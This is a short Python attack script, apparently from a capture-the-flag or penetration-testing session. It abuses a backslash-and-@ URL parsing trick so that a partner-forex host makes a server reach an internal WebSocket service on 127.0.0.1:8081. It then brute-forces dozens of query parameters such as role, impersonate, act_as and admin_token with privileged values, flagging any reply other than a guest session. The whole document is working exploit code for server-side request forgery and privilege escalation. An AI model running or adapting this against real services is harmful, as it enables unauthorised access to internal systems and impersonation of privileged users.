import time, select, itertools
from ws import connect, recv_frame
names=["partner","partner_id","partnerId","partner-id","id","identity","ident","user","username",
"role","auth","token","key","apikey","api_key","api-key","session","sid","as","act_as","act-as",
"impersonate","on_behalf","principal","subject","tenant","account","client","client_id","scope",
"mode","admin","ops","debug","internal","v","version","proto","protocol","identify","auth_token",
"access_token","vault_token","admin_token","relay","core","ledger","name","who","whoami","u","p"]
vals=["ops","admin","internal","1","true"]
def trial(q):
    inner=f"http://rates.partner-forex.example.com\\@127.0.0.1:8081/ws?{q}"
    try:
        s,resp=connect(inner=inner); s.setblocking(False)
        out=[]; end=time.time()+0.6
        while time.time()<end:
            r,_,_=select.select([s],[],[],0.07)
            if r:
                try: out.append(recv_frame(s)[1])
                except Exception: out.append(b"EOF"); break
        s.close()
        return out
    except Exception:
        return None
hit=0
for n in names:
    for v in vals:
        out=trial(f"{n}={v}")
        rdy=[x for x in out or [] if isinstance(x,bytes) and x.startswith(b"READY")]
        if rdy and rdy[0]!=b"READY guest":
            print("HIT",n,v,rdy,flush=True); hit+=1
print("hits",hit)
